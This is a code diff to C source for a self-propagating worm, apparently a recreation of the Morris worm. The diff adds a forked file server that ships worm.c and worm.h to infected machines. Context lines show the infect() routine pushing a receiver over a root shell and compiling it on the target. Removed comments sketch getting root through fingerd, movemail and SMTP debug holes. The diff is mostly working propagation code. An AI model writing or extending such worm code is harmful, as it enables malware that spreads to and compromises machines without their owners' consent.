@@ -60,7 +60,6 @@ void get_local_ip(char *ip) {
 	close(sock);
 }
 
-
 /**
  * Deploys receive_file_bsd.c on target machine
  * sock - The active root shell
@@ -203,27 +202,22 @@ void infect(char *ip, char *my_ip) {
 	// Send receive_file_bsd.c (vector) over
 	deploy_receive_file(sock, my_ip);
 
-    /* 
-    probably need to spin up send_file_over_socket.c on the attacker side here.
-    need to chat with changwoo abt this to clear up order of operations
-    */
+    
+	/* Fork file server to handle incoming file transfer requests */
+	if (fork() == 0) {
+		/* Child process executes send_file_over_socket with worm files */
+		char *argv[] = {
+			"send_file_over_socket",
+			"worm.c",
+			"worm.h",
+			NULL
+		};
+		execv("./send_file_over_socket", argv);
+		exit(1);  /* If execv fails */
+	}
+	/* Parent continues with worm propagation on target */
 
-    /* 
-    Idea: Use SMTP debug vulnerablity to pull the files over instead...
-
-    Something like this:
-        - connect socket to fingerd server
-        - do movemail and whatever to get root shell
-        - in root shell, use smtp debug to tell attacking machine to send over 
-            worm.c and worm.h (and whatever else)
-        - compile and run worm.c, in theory completing self propogation
-
-    Is this faithful to morris worm? Probably not? Idk. Needs more thought
-    */
-
-    // Compile and run receive_file, should pull in worm.c and worm.h from attacker
-    // also probably needs to pull over send_file_over_socket.c and send_file_over_socket.h
-    // still slightly unclear on how recive_file works
+    // Compile and run receive_file, should pull in worm.c, worm.h, and send_file_over_socket.c from attacker
 	printf("[*] Compiling receive_file.c on target...\n");
 	write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
 	sleep(2);
